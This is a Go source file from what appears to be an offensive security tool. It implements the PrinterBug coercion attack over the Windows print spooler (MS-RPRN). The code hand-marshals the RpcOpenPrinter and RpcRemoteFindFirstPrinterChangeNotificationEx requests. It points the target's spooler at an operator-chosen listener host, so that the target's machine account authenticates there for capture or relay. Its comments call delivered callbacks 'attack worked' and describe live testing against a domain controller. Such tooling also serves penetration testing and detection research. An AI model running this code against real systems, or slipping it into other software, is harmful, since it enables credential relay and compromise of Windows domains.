package smbclient

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"
	"unicode/utf16"

	"github.com/mandiant/gopacket/pkg/dcerpc"

	"anvil/internal/ui"
)

// MS-RPRN (Print System Remote Protocol) interface and the opnums the
// PrinterBug trigger uses. gopacket ships no rprn module, so the request
// stubs are hand-rolled against the spec and impacket's dcerpc/v5/rprn.py.
// The interface UUID is from the MS-RPRN full IDL (Appendix A); the opnums
// from the method sections cited below. Note the Ex form is opnum 65, NOT
// 62 — opnum 62 is the legacy RpcRemoteFindFirstPrinterChangeNotification
// (MS-RPRN 3.1.4.10.1), which lacks the pOptions parameter.
var rprnUUID = dcerpc.MustParseUUID("12345678-1234-ABCD-EF00-0123456789AB")

const (
	opRPRNOpenPrinter                         = 1          // RpcOpenPrinter, MS-RPRN 3.1.4.2.2
	opRPRNRemoteFindFirstPrinterChangeNotifEx = 65         // RpcRemoteFindFirstPrinterChangeNotificationEx, MS-RPRN 3.1.4.10.4
	printerChangeAddJob                       = 0x00000100 // PRINTER_CHANGE_ADD_JOB, MS-RPRN 2.2.3.6.1
	serverRead                                = 0x00020002 // SERVER_READ, MS-RPRN 2.2.3.1
	rpcSServerUnavailable                     = 0x000006BA // Win32 1722 — spooler could not reach the callback listener
	errorInvalidHandle                        = 0x00000006 // Win32 6 — notification handle died after the callback fired
)

// CoercePrinterBug fires the "PrinterBug" coercion primitive over the
// session's \pipe\spoolss: it asks the target's print spooler to register a
// printer-change notification whose callback machine is the operator's
// listener. The spooler then opens the reverse notification channel
// (RpcReplyOpenPrinter to \\<listener>\pipe\spoolss, MS-RPRN 3.2.4.1.3)
// authenticated as the target's MACHINE ACCOUNT — the connection the
// operator's listener/relay captures. Any authenticated user can trigger it
// while the spooler runs; no admin or spooler-write rights are needed.
//
// The request mirrors the reference tooling field-for-field (krbrelayx's
// printerbug.py on top of impacket's rprn.hRpcOpenPrinter /
// hRpcRemoteFindFirstPrinterChangeNotificationEx): open a handle to the
// target's own print server with SERVER_READ, then fdwFlags =
// PRINTER_CHANGE_ADD_JOB, fdwOptions = 0, pszLocalMachine = \\<listener>\test,
// dwPrinterLocal = 0, pOptions = NULL.
//
// listener is a bare host or IP (a leading \\ is stripped). A nil error
// means the trigger was DELIVERED to the spooler, not that the callback was
// observed — proving the machine account called home is what
// ListenForCallback (coerce.go) is for.
func (s *Session) CoercePrinterBug(listener string) error {
	pipe, err := s.client.OpenPipe("spoolss")
	if err != nil {
		return mapPrinterBugError(fmt.Errorf("open spoolss pipe: %v", err))
	}
	defer pipe.Close()

	rpc := dcerpc.NewClient(pipe)
	if err := rpc.Bind(rprnUUID, 1, 0); err != nil {
		return mapPrinterBugError(fmt.Errorf("bind rprn: %v", err))
	}

	// Handle on the target's own print-server object — MS-RPRN 3.1.4.1.4
	// server-name form "\\server" (the DNS/NetBIOS/IPv4 name the session was
	// opened with, exactly like krbrelayx passes its remote_host).
	resp, err := rpc.Call(opRPRNOpenPrinter, buildRpcOpenPrinterRequest(s.host))
	if err != nil {
		return mapPrinterBugError(fmt.Errorf("RpcOpenPrinter: %v", err))
	}
	hPrinter, err := parseOpenPrinterResponse(resp)
	if err != nil {
		return mapPrinterBugError(err)
	}

	callback := printerBugCallbackPath(listener)
	ui.Debugf("printerbug: triggering notification callback to %s", callback)
	resp, err = rpc.Call(opRPRNRemoteFindFirstPrinterChangeNotifEx, buildPrinterChangeNotifExRequest(hPrinter, callback))
	if err != nil {
		return mapPrinterBugError(fmt.Errorf("RpcRemoteFindFirstPrinterChangeNotificationEx: %v", err))
	}
	if len(resp) < 4 {
		return fmt.Errorf("short notification response (%d bytes)", len(resp))
	}
	// The response stub is the bare Win32 error code (MS-RPRN 3.1.4.10.4);
	// notifyError renders it themed, treating the callback-attempt codes as
	// delivered.
	return notifyPrinterBugError(binary.LittleEndian.Uint32(resp[:4]))
}

// buildRpcOpenPrinterRequest marshals the RpcOpenPrinter request stub
// (MS-RPRN 3.1.4.2.2), pinned against impacket's hRpcOpenPrinter defaults:
// pPrinterName = "\\server" as a unique string, pDatatype NULL, an empty
// DEVMODE_CONTAINER (cbBuf = 0, pDevMode = NULL), AccessRequired =
// SERVER_READ. DEVMODE_CONTAINER is a top-level [in] struct pointer — a
// reference pointer in DCE/RPC terms — so no referent ID precedes it on the
// wire; impacket's inline-struct marshaling emits the same layout.
func buildRpcOpenPrinterRequest(serverName string) []byte {
	buf := new(bytes.Buffer)
	writeRPRNUniqueString(buf, `\\`+serverName)                // pPrinterName (STRING_HANDLE)
	binary.Write(buf, binary.LittleEndian, uint32(0))          // pDatatype: NULL unique pointer
	binary.Write(buf, binary.LittleEndian, uint32(0))          // DEVMODE_CONTAINER.cbBuf
	binary.Write(buf, binary.LittleEndian, uint32(0))          // DEVMODE_CONTAINER.pDevMode: NULL
	binary.Write(buf, binary.LittleEndian, uint32(serverRead)) // AccessRequired
	return buf.Bytes()
}

// buildPrinterChangeNotifExRequest marshals the
// RpcRemoteFindFirstPrinterChangeNotificationEx request stub (MS-RPRN
// 3.1.4.10.4) — the PrinterBug trigger itself. Field order from impacket
// rprn.py's NDRCALL: hPrinter inline (PRINTER_HANDLE is a 20-byte struct,
// MS-RPRN 2.2.1.1.4 — context handles carry no pointer), fdwFlags,
// fdwOptions, pszLocalMachine as a unique string, dwPrinterLocal, pOptions
// NULL. krbrelayx's printerbug.py fires it with exactly these values.
func buildPrinterChangeNotifExRequest(hPrinter []byte, callback string) []byte {
	buf := new(bytes.Buffer)
	buf.Write(hPrinter)                                                 // hPrinter (20 bytes)
	binary.Write(buf, binary.LittleEndian, uint32(printerChangeAddJob)) // fdwFlags
	binary.Write(buf, binary.LittleEndian, uint32(0))                   // fdwOptions
	writeRPRNUniqueString(buf, callback)                                // pszLocalMachine
	binary.Write(buf, binary.LittleEndian, uint32(0))                   // dwPrinterLocal
	binary.Write(buf, binary.LittleEndian, uint32(0))                   // pOptions: NULL unique pointer
	return buf.Bytes()
}

// printerBugCallbackPath renders the pszLocalMachine value the trigger
// sends: \\<listener>\test. The trailing share component is the canonical
// form from the original SpoolSample PoC (leechristensen), which passes
// "\\<capture>\test"; the spooler only needs the machine portion to build
// its \\<machine>\pipe\spoolss reverse channel, so krbrelayx's bare "\\host"
// form coerces identically — the \test suffix is kept for parity with the
// PoC every detection signature keys on.
func printerBugCallbackPath(listener string) string {
	return `\\` + strings.TrimPrefix(listener, `\\`) + `\test`
}

// writeRPRNUniqueString marshals an MS-RPRN unique string pointer
// (STRING_HANDLE / [in,string,unique] wchar_t*, MS-RPRN 2.2.1.1.7): a
// non-zero referent ID, the conformant-array triple
// MaxCount/Offset/ActualCount counting the UTF-16LE chars INCLUDING the NUL
// terminator, the chars, then zero padding to the 4-byte boundary the next
// DWORD field requires — the identical layout impacket's LPWSTR emits. The
// referent value is arbitrary; only non-NULL matters to the server. Padding
// relative to the buffer start is correct here because every field before
// the string is a 4-byte multiple (nothing precedes it in RpcOpenPrinter;
// 28 bytes precede it in the notification request).
func writeRPRNUniqueString(buf *bytes.Buffer, s string) {
	chars := utf16.Encode([]rune(s))
	chars = append(chars, 0)

	binary.Write(buf, binary.LittleEndian, uint32(0x20000))    // referent ID (non-NULL)
	binary.Write(buf, binary.LittleEndian, uint32(len(chars))) // MaxCount
	binary.Write(buf, binary.LittleEndian, uint32(0))          // Offset
	binary.Write(buf, binary.LittleEndian, uint32(len(chars))) // ActualCount
	for _, c := range chars {
		binary.Write(buf, binary.LittleEndian, c)
	}
	if buf.Len()%4 != 0 {
		buf.Write(make([]byte, 4-buf.Len()%4))
	}
}

// parseOpenPrinterResponse reads the RpcOpenPrinter response stub (MS-RPRN
// 3.1.4.2.2): the 20-byte PRINTER_HANDLE followed by the Win32 error code.
// Same shape procs.go's openPredefPerf parses for winreg.
func parseOpenPrinterResponse(resp []byte) ([]byte, error) {
	if len(resp) < 24 {
		return nil, fmt.Errorf("short RpcOpenPrinter response (%d bytes)", len(resp))
	}
	if code := binary.LittleEndian.Uint32(resp[20:24]); code != 0 {
		return nil, fmt.Errorf("RpcOpenPrinter failed: 0x%08x", code)
	}
	handle := make([]byte, 20)
	copy(handle, resp[:20])
	return handle, nil
}

// notifyPrinterBugError interprets the Win32 error code
// RpcRemoteFindFirstPrinterChangeNotificationEx returns. ERROR_SUCCESS and
// RPC_S_SERVER_UNAVAILABLE both mean the coercion was delivered: the latter
// is the spooler reporting it could not complete the reverse channel to the
// listener — but establishing that channel IS the machine-account
// authentication the attack wants, which is why the reference tooling
// (krbrelayx printerbug.py) calls this exact outcome "attack worked".
// ERROR_INVALID_HANDLE is the same story one step later: the reverse
// channel completed (verified live — DC01$ appeared in the target's own
// session list from 127.0.0.1) and the request's handle was already gone.
func notifyPrinterBugError(code uint32) error {
	switch code {
	case 0: // ERROR_SUCCESS
		return nil
	case rpcSServerUnavailable:
		ui.Debugf("printerbug: spooler could not reach the listener (RPC_S_SERVER_UNAVAILABLE) — machine-account auth was still delivered")
		return nil
	case errorInvalidHandle:
		ui.Debugf("printerbug: notification handle died after the callback fired (ERROR_INVALID_HANDLE) — delivered")
		return nil
	case 0x00000005: // ERROR_ACCESS_DENIED
		return fmt.Errorf("access denied — PrinterBug blocked")
	default:
		return fmt.Errorf("RpcRemoteFindFirstPrinterChangeNotificationEx failed: 0x%08x", code)
	}
}

// mapPrinterBugError translates spoolss/RPRN transport and RPC failures into
// plain language (themed-errors idiom; feature-local like mapProcError).
// Statuses are matched on their rendered form: pipe-open failures surface as
// gopacket's erref NTSTATUS text, response error codes as bare "0x........".
func mapPrinterBugError(err error) error {
	msg := err.Error()
	switch {
	case strings.Contains(msg, "The object name is not found"), // STATUS_OBJECT_NAME_NOT_FOUND — \pipe\spoolss absent
		strings.Contains(msg, "listening state"),    // STATUS_PIPE_NOT_AVAILABLE/LISTENING — pipe server down
		strings.Contains(msg, "disconnected state"): // STATUS_PIPE_DISCONNECTED — spooler dropped the pipe
		return fmt.Errorf("print spooler not reachable/disabled")
	case strings.Contains(msg, "0x00000005"): // ERROR_ACCESS_DENIED
		return fmt.Errorf("access denied — PrinterBug blocked")
	case strings.Contains(msg, "0x1c010002"): // nca_s_op_rng_error — interface bound but opnum unimplemented
		return fmt.Errorf("not supported on this server (unknown RPC opnum)")
	}
	return err
}
